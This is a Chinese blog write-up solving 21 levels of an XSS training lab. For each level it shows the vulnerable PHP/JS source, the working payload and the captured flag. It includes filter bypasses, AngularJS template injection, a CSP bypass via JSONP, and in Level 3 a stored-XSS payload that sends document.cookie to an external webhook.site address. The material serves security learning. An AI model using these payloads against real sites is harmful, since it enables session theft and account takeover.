---
abbrlink: ''
categories:
- - web渗透学习
date: '2026-11-11T10:21:41.654084+08:00'
tags:
- xss
title: XSS-Sec 1-21
updated: '2026-11-11T10:39:20.323+08:00'
---
## 简介

此为 https://github.com/duckpigdog/XSS-Sec/ 里面的题目，自行分析源码然后构造 payload，不过笔者感觉除了存储型 xss 以外，其他的例如反射性 xss，dom 型 xss，都没有太大的作用，因为都是只能弹本地的 cookie。

## Level 1: Reflected XSS

源码：

```php
<?php
// admin.php - Headless Admin Bot for Level 1
include '../headers.php';
// Only accepts POST requests.
// Invisible to the user (no UI output unless in debug mode, but we hide it via JS/CSS).

// Security Check: Only allow POST
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(403);
    die("Access Denied: Admin Bot only accepts dispatch orders.");
}

// Set the flag cookie (HttpOnly = false for XSS)
setcookie("flag", "flag{949703b0-facb-4492-b44a-093dcb0ad1b1}", time() + 3600, "/", "", false, false);

$target_url = isset($_POST['url']) ? $_POST['url'] : '';

if (empty($target_url)) {
    die("Error: No target URL provided.");
}
?>
```

在下面那个 Report to admin 的框框里输入以下 payload：

```
<script>alert(document.cookie)</script>
```

![image](https://img2.eval.moe/qexo/2026/11/edba8775ba50474702005ce8c93ed7dd.png)

## Level 2: DOM-based XSS

源码：

```php
﻿<?php 
include '../headers.php'; 
setcookie("flag", "flag{b1e49ef8-e15c-4e1e-b82f-04660ed96a98}", time() + 3600, "/", "", false, false);
?>
```

payload:

```
http://192.168.111.20/level2/index.php?keyword=%3Cimg%20src=x%20onerror=alert(document.cookie)%3E
```

![image](https://img2.eval.moe/qexo/2026/11/a0bce28361e9efe606fa4f8862477e61.png)

## Level 3: Stored XSS

源码：

```php
﻿<?php
include '../headers.php';
setcookie("flag", "flag{14f21ca0-a13e-416e-a7b1-f93cb69df341}", time() + 3600, "/", "", false, false);
$file = '../data/comments.json';

// Handle POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Clear Comments
    if (isset($_POST['clear'])) {
        if (file_exists($file)) {
            file_put_contents($file, json_encode([]));
        }
        // Redirect to prevent resubmission
        header("Location: index.php");
        exit;
    }...
```

payload:

```javascript
<script>fetch("https://webhook.site/352156e0-b618-4679-9064-67e3ee35c5f9?c="+document.cookie)</script>
```

![image](https://img2.eval.moe/qexo/2026/11/703027ae0e48ae8608a2d8cf161751d4.png)

## Level 4: Attribute Breakout

源码：

```
            <input type="text" name="keyword" value="<?php echo $keyword; ?>">
```

payload:

```
"+autofocus+onfocus%3D"alert%28document.cookie%29
```

```
flag=flag%7B64145663-3bf8-49aa-a2ac-95a13ee84e96%7D
```

## Level 5: Filter Bypass

源码：

```php
            <?php
            if (isset($_GET['keyword'])) {
                $str = $_GET['keyword'];
            
                // Vulnerability: Simple blacklist filter
                // Only <script> is banned, forcing the use of other tags/attributes
            
                $str = str_ireplace("<script", "<scr_ipt", $str);
            
                // on events are ALLOWED in this level to demonstrate alternate vectors
            
                echo "Result: " . $str;
            }
            ?>
```

payload:

```html
<img src="x" onerror="alert(document.cookie)">
```

```
flag=flag%7Bfb6abe6c-0278-4961-ad54-e8b28bd53eb9%7D
```

## Level 6: Quote Filtering

源码：

```php
	            <input type="text" name="keyword" value='<?php echo $keyword_safe; ?>'>
            <?php
                $keyword = isset($_GET['keyword']) ? $_GET['keyword'] : '';
                // Vulnerability: Only double quotes are filtered
                // The input is placed into an attribute defined with SINGLE quotes
                $keyword_safe = str_replace('"', '"', $keyword);
            ?>
```

payload:

```
'autofocus onfocus='alert(document.cookie)
```

```
flag=flag%7B1b6a3fb2-1c77-407f-9695-450121751f7e%7D
```

## Level 7: Keyword Removal

源码：

```php
                $bad_words = ['script', 'on', 'src', 'data', 'href'];
                foreach ($bad_words as $word) {
                    $str = str_replace($word, '', $str);
                }
                $str = $_GET['keyword']; // Get original case
                $str = str_ireplace($bad_words, '', $str); // Case-insensitive replace with empty string
            
                echo "Result: <input value=\"" . $str . "\">";
```

payload:

```
" autofocus oonnfocus="alert(document.cookie)
```

```
flag=flag%7B4fb8d6c8-7c1d-446c-8dd8-49a5f87d37e8%7D
```

## Level 8: Encoding Bypass

源码：

```php
                $str = str_replace("script", "scr_ipt", $str);
                $str = str_replace("on", "o_n", $str);
                $str = str_replace("src", "sr_c", $str);
                $str = str_replace("data", "da_ta", $str);
                $str = str_replace("href", "hr_ef", $str);
                $str = str_replace("javascript", "java_script", $str);
                $str = htmlspecialchars($str); 
                $str = $_GET['keyword'];
                $str = str_replace("script", "scr_ipt", $str);
                $str = str_replace("on", "o_n", $str);
                $str = str_replace("src", "sr_c", $str);
                $str = str_replace("data", "da_ta", $str);
                $str = str_replace("href", "hr_ef", $str);
                $str = str_replace("javascript", "\"java_script\"", $str); // Break it with quotes
                $str = str_replace('"', '"', $str); // Escape double quotes to prevent breakout
            
                echo '<a href="' . $str . '">Your Link</a>';
```

payload:

```
javascript:alert(document.cookie)
```

html 编码后：

```
javascript:alert(document.cookie)
```

```
flag=flag%7B8aa86ec1-58b4-44e0-b457-4ef5d05048bd%7D
```

## Level 9: URL Validation

源码:

```php
            <?php
            if (isset($_GET['keyword'])) {
                $str = $_GET['keyword'];
            
                // Security Check 1: Keyword Removal (replaces with empty string)
                // Vulnerability: Only replaces once, allowing double write bypass.
                $str = str_ireplace("script", "", $str); 
            
                // Security Check 2: Must contain "http://"
                if (strpos($str, 'http://') === false) {
                    echo '<p style="color:red;">Error: Invalid URL. Must contain http://</p>';
                } else {
                    // Output
                    echo '<a href="' . $str . '">Your Link</a>';
                }
            }
            ?>
```

payload:

```
" autofocus onfocus="alert(document.cookie)" "http://x
```

## Level 10: Protocol Bypass

源码:

```php
                $str = str_replace("javascript", "", $str);
                $str = str_replace("script", "", $str);
            
                echo '<a href="' . $str . '">Your Link</a>';
```

payload:

```
JavaScript:(alert(document.cookie))
```

```
flag=flag%7B2ffbdc31-a616-44d3-96a6-4681f714bb06%7D
```

## Level 11: JS Context

源码:

```php
            <script>
            <?php
            if (isset($_GET['keyword'])) {
                $str = $_GET['keyword'];
            
                // Vulnerability: 
                // Input is echoed directly into a JavaScript string variable.
                // It is NOT encoded for JavaScript context (no json_encode).
                // It might be htmlspecialchars() encoded, but that doesn't escape single quotes by default (unless ENT_QUOTES is set).
                // Or simply, we just echo it.
            
                // For this level, we simulate a common mistake: 
                // Developer uses user input inside a JS string without escaping quotes.
            
                // Context: var t_str = 'USER_INPUT';
                // Goal: ';alert(1);//
            
                // We deliberately DO NOT escape single quotes here.
                // We only escape < and > to prevent direct tag injection, forcing the user to use JS context breakout.
                $str_safe = str_replace(['<', '>'], ['<', '>'], $str);
            
                echo "var t_str = '$str_safe';";
                echo "\n            document.write('Current Search: ' + t_str);";
            } else {
                echo "var t_str = 'Guest';";
            }
            ?>
            </script>
```

payload:

```
';alert(document.cookie);//
或
';document.body.innerText=alert(document.cookie);//
```

```
flag=flag%7B9b93b9f9-e9e2-4168-9871-4540c20c97a7%7D
```

## Level 12: SaaS Dashboard - CloudManage

源码:

```php
            var tab = decodeURIComponent(hash.substring(1));
        
            // Update UI Active State
            menuLinks.forEach(link => {
                link.classList.remove('active');
                if (link.getAttribute('onclick').includes("'" + tab + "'")) {
                    link.classList.add('active');
                }
            });
            document.getElementById('current-page').textContent = tab.charAt(0).toUpperCase() + tab.slice(1);

            // Vulnerability: 
            // We reflect the tab name into the DOM while "loading".
            // If the tab doesn't exist, we show an error message that also reflects the input.
        
            container.innerHTML = '<div style="text-align:center; padding: 50px;">' +
                                  '<div class="loading-spinner"></div>' +
                                  '<p>Loading module: <strong>' + tab + '</strong>...</p>' + 
                                  '</div>';
...
			 else {
                    // Error State - Vulnerable Reflection
                    container.innerHTML = '<div class="error-message">' +
                                          '<h3>404 Module Not Found</h3>' +
                                          '<p>The requested module "<b>' + tab + '</b>" does not exist or you do not have permission to view it.</p>' +
                                          '</div>';
                }
```

payload:

```
http://192.168.111.20/level12/#%3Cimg%20src=x%20onerror=alert(document.cookie)%3E
```

```
flag=flag%7Blocation_hash_xss_level12%7D
```

## Level 13: Frontend Filter

源码:

```php
        <div id="result" class="message"></div>

        <script>
            // Vulnerability: The filtering happens in the browser (Frontend)
            // It uses a Regex to check for malicious content.
        
            function processInput() {
                const urlParams = new URLSearchParams(window.location.search);
                const keyword = urlParams.get('keyword');
            
                if (keyword) {
                    // Filter: Block <script> tags and 'javascript:' protocol
                    const blacklist = /<script|javascript:/i;
                
                    if (blacklist.test(keyword)) {
                        document.getElementById('result').innerText = "馃毇 Malicious content detected!";
                        document.getElementById('result').style.color = "red";
                    } else {
                        // Sink: innerHTML
                        // If we pass the regex, we get into innerHTML
                        document.getElementById('result').innerHTML = "Results: " + keyword;
                    }
                }
            }
        
            processInput();
        </script>
```

payload:

```
<img src=x onerror=alert(document.cookie)>
```

```
flag=flag%7Bff7321ad-67e8-4e92-b126-915f360c5e30%7D
```

## Level 14: Double Encoding

源码:

```php
        <div id="result" class="message"></div>

        <script>
            <?php
            if (isset($_GET['keyword'])) {
                $str = $_GET['keyword'];
            
                // Security Check 1 (WAF Layer):
                // We strictly forbid literal quotes and angle brackets.
                // This happens AFTER the first automatic URL decode (by PHP $_GET).
                // If user sends '%27', PHP sees "'".
                // If user sends "'", PHP sees "'".
                // Both are caught here.
            
                if (preg_match("/['\"<>]/", $str)) {
                    // WAF Blocked: Sanitize dangerous chars
                    $str = str_replace(['\'', '"', '<', '>'], '_', $str);
                }
            
                // Vulnerability Implementation (Double Encoding Logic):
            
                // 1. Backend Encoding
                // The backend THEN proceeds to output the "cleaned" string into a JS variable.
                $encoded = urlencode($str);
            
                // 2. Frontend Logic
                echo "\n            var rawInput = '$encoded';";
            
                echo "\n            // Legacy System: Two rounds of decoding";
                echo "\n            var step1 = decodeURIComponent(rawInput);";
                echo "\n            var step2 = decodeURIComponent(step1);";
            
                // Correct sink: We need to make sure the breakout syntax is valid.
                echo "\n            setTimeout('console.log(\"Log: ' + step2 + '\")', 100);";
            }
            ?>
        </script>
```

payload:

```
");alert(document.cookie);//
```

url 编码两次后:

```
%2522)%253Balert(document.cookie)%253B%252F%252F
```

```
flag=flag%7Bc806ce06-d997-4871-a267-4f71f6872664%7D
```

## Level 15 - Angular/Framework XSS

源码:

```php
<body ng-app="">...
            <?php
            if (isset($_GET['keyword'])) {
                $str = $_GET['keyword'];
          
                // Vulnerability: Outputting directly into an AngularJS template context
                // If user inputs {{ 7 * 7 }}, Angular evaluates it.
                // This is Client-Side Template Injection (CSTI).
          
                // Also, "HTML -> JS -> HTML" logic:
                // The server outputs HTML.
                // Angular (JS) reads it as a template.
                // Angular renders it back to HTML.
          
                // We do htmlspecialchars to prevent "traditional" XSS (<script>)
                // BUT we do NOT escape Angular template syntax {{ }}.
          
                $safe_html = htmlspecialchars($str);
          
                echo "<div id='result'>Hello, $safe_html</div>";
            }
            ?>
            ...
        <div style="margin-top:20px; font-size:0.8em; color:#666;">
            Angular Version: 1.8.2 <br>
        </div>
```

{% raw %}

ng-app 里的代码会被 Angular 当作模板编译执行，AngularJS 1.8.2 的表达式沙箱在 1.6+ 已基本移除（官方在 1.6 移除了沙箱，认为它不安全）。所以 {{ }} 里可以直接调用一些全局函数，不过我们要利用 \$eval 或构造函数进行逃逸。
payload:

```
{{constructor.constructor('alert(document.cookie)')()}}
```

```
flag=flag%7Bd60d4d81-43f1-4a14-b909-c46cb3472c44%7D
```

{% raw %}

## Level 16: PostMessage XSS

源码:

```php
            <?php
            if (isset($_GET['keyword'])) {
                $str = $_GET['keyword'];
            
                // Vulnerability: 
                // 1. Input flows into iframe src.
                // 2. "javascript" protocol is blocked to prevent direct XSS in iframe context.
                // 3. User can use "data:" protocol.
                // 4. "data:" iframe has Opaque Origin (null), so cannot access parent DOM directly.
                // 5. BUT parent has a 'message' event listener that trusts data from iframes.
            
                $str = str_ireplace("javascript", "", $str);
            
                // We use htmlspecialchars to prevent breaking out of the src attribute.
                // This forces the user to exploit the URL content itself.
                echo '<iframe src="' . htmlspecialchars($str) . '" width="100%" height="100"></iframe>';
            } else {
                echo '<iframe src="about:blank" width="100%" height="100"></iframe>';
            }
            ?>
        </div>
        <script>
            // Vulnerable Event Listener
            // It trusts any message sent to it and writes it to innerHTML.
            window.addEventListener('message', function(e) {
                // In a real scenario, there should be an origin check here:
                // if (e.origin !== "https://trusted.com") return;
            
                console.log("Received message:", e.data);
                document.getElementById('message-output').innerHTML = "Received: " + e.data;
            });
        </script>
```

payload:

```
data:text/html,<script>parent.postMessage('<img src=x onerror=alert(document.cookie)>', '*')</script>
```

```
flag=flag%7Bcc24faef-8a6e-45a9-85d8-72db6e41a55c%7D
```

## Level 17: CSP Bypass

CSP 是什么？

* CSP（内容安全策略，Content Security Policy）本质上是一份由网站服务器下发给浏览器的“资源加载白名单”。它明确告诉浏览器：当前页面只允许从哪些地方加载脚本、样式、图片等资源，从而大幅降低跨站脚本攻击（XSS）等安全风险。
  源码:

```php
﻿<?php 
// 1. JSONP Endpoint Simulation
// If 'callback' parameter is present, we act as an API returning JSONP.
// This is commonly found in the same domain or subdomains.
if (isset($_GET['callback'])) {
    header('Content-Type: application/javascript');
    $cb = $_GET['callback'];
    // Simple check to prevent basic XSS in callback (optional, but let's allow it for the lab)
    // In real world, callbacks should be validated (e.g. ^[a-zA-Z0-9_]+$).
    // Here we leave it open to demonstrate the vulnerability.
    echo $cb . '({"status": "ok", "time": "' . date('Y-m-d H:i:s') . '"});';
    exit;
}

// 2. CSP Header
// Strict CSP: Only allow scripts from 'self'. No inline scripts, no 'unsafe-inline'.
header("Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';");
```

payload:

```
<script src=/level17/index.php?callback=alert(document.cookie)//></script>
```

```
flag=flag%7B8d2a43e4-7157-4349-8cbe-192c3c3a08a1%7D
```

## Level 18: Understanding Stored XSS Vulnerabilities

源码:

```php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $author = $_POST['author'] ?? 'Anonymous';
    $website = $_POST['website'] ?? '';
    $comment = $_POST['comment'] ?? '';
  
    $website_safe = htmlspecialchars($website, ENT_QUOTES); 
    $author_safe = htmlspecialchars($author);
    $comment_safe = htmlspecialchars($comment);
  
    $new_comment = [
        'author' => $author_safe,
        'website' => $website_safe, 
        'comment' => $comment_safe,
        'time' => date('Y-m-d H:i:s')
    ];
  
    $current_data = json_decode(file_get_contents($db_file), true);
    $current_data[] = $new_comment;
    file_put_contents($db_file, json_encode($current_data));
  
    header("Location: index.php");
    exit;
}

if (isset($_GET['clear'])) {
    file_put_contents($db_file, json_encode([]));
    header("Location: index.php");
    exit;
}
            <?php
            $comments = json_decode(file_get_contents($db_file), true);
            if (!empty($comments)) {
                foreach ($comments as $c) {
                    $initial = strtoupper(substr($c['author'], 0, 1));
                    echo '<div class="comment">';
                    echo '<div class="comment-header">';
                    echo '<div class="avatar">' . $initial . '</div>';
                    echo '<div>';
                
                    if (!empty($c['website'])) {
                        echo '<span class="author-name"><a href="' . $c['website'] . '">' . $c['author'] . '</a></span>';
                    } else {
                        echo '<span class="author-name">' . $c['author'] . '</span>';
                    }
                
                    echo '<div class="comment-date">' . $c['time'] . '</div>';
                    echo '</div>'; // end div
                    echo '</div>'; // end header
                    echo '<div class="comment-body">' . $c['comment'] . '</div>';
                    echo '</div>';
                }
            } else {
                echo '<p style="color:#777; font-style:italic;">No comments yet. Be the first to share your thoughts!</p>';
            }
            ?>
```

主要利用了 htmlspecialchars 不管协议的原理，所以只有 javascript 能绕过，payload:
![image](https://img2.eval.moe/qexo/2026/11/45b0e7c602e5261125ce36d1a8b30b2c.png)

```
flag=flag%7B1a7b5cd7-f083-40c2-886c-3300609e0bf8%7D
```

## Level 19: Global Shop - Product Details

源码:

```php
                    <script>
                        var stores = ["London", "Paris", "Milan", "Tokyo", "New York", "Berlin"];
                    
                        // Get storeId from URL
                        var store = (new URLSearchParams(window.location.search)).get('storeId');
                    
                        document.write('<select name="storeId">');
                    
                        // If a store is selected in URL, write it as the first option (selected)
                        if (store) {
                            document.write('<option selected>' + store + '</option>');
                        } else {
                             document.write('<option disabled selected>Select a city...</option>');
                        }
                    
                        // List other stores
                        for (var i = 0; i < stores.length; i++) {
                            if (stores[i] === store) {
                                continue;
                            }
                            document.write('<option>' + stores[i] + '</option>');
                        }
                    
                        document.write('</select>');
                    </script>
```

payload:

```
	http://192.168.111.20/level19/?storeId=</select><img src=x onerror=alert(document.cookie)>
```

```
flag=flag%7Bd2fea7d2-b235-4552-8391-7102eeb25ea6%7D
```

## Level 20: Customer Feedback - TechCorp

源码:

```php
        <script>
            $(document).ready(function() {
                // Get the 'returnPath' parameter from the URL
                var params = new URLSearchParams(window.location.search);
                var returnPath = params.get('returnPath');
            
                // If the auto-redirect script just ran, window.location.search might be updated in history but not DOM
                // But new URLSearchParams(window.location.search) reads current location.
            
                if (returnPath) {
                    // Vulnerable Code:
                    // Using jQuery's attr() to set href from untrusted source
                    // If returnPath is "javascript:alert(1)", it executes XSS.
                    $('#backLink').attr('href', returnPath);
                }
            });
        
            // Simple form handling (simulation)
            $('#feedbackForm').on('submit', function(e) {
                e.preventDefault();
                alert('Thank you for your feedback!');
            });
        </script>
```

payload:

```
http://192.168.111.20/level20/?returnPath=javascript:alert(document.cookie)
```

然后点一下左下角的 Back to Home 拿到 flag

```
flag=flag%7Bf86af6e9-4e9f-4088-8755-f227388b84d1%7D
```

## Level 21: JS String Reflection

源码:

```php
        <div class="message">
            <?php
            $query = isset($_GET['q']) ? $_GET['q'] : '';
            if ($query) {
                echo '<h2>Results for: ' . htmlspecialchars($query) . '</h2>';
                echo '<p style="color:#999;">Found 0 results (0.14 seconds)</p>';
            } else {
                echo '<p>Enter a keyword to search the internal knowledge base.</p>';
            }
            ?>
        </div>

    <script>
        var analyticsData = {
            sessionId: "sess_<?php echo uniqid(); ?>",
            timestamp: <?php echo time(); ?>,
            searchTerm: '<?php echo isset($_GET['q']) ? htmlspecialchars($_GET['q'], ENT_COMPAT) : ''; ?>',
            category: 'general'
        };

        var img = new Image();
        img.src = '/log?q=' + encodeURIComponent(analyticsData.searchTerm);
        console.log("Analytics sent for:", analyticsData.searchTerm);
    </script>
```

htmlspecialchars() 的第二个参数为 ENT\_COMPAT 的时候，将不会转义单引号，payload:

```
',x: alert(document.cookie),//
```

```
flag=flag%7B064b7412-4974-4053-ac90-8d5c3d1ba2a6%7D
```

## 拓展——HttpOnly 的作用

当一个 Cookie 被标记为 HttpOnly 后：

* JavaScript 无法访问：你无法通过 document.cookie 来读取或修改这个 Cookie。
* 浏览器仍会自动携带：在向该 Cookie 所属的服务器发起正常的 HTTP 请求（包括由 JavaScript 发起的 fetch 或 XMLHttpRequest 请求）时，浏览器依然会自动带上它。
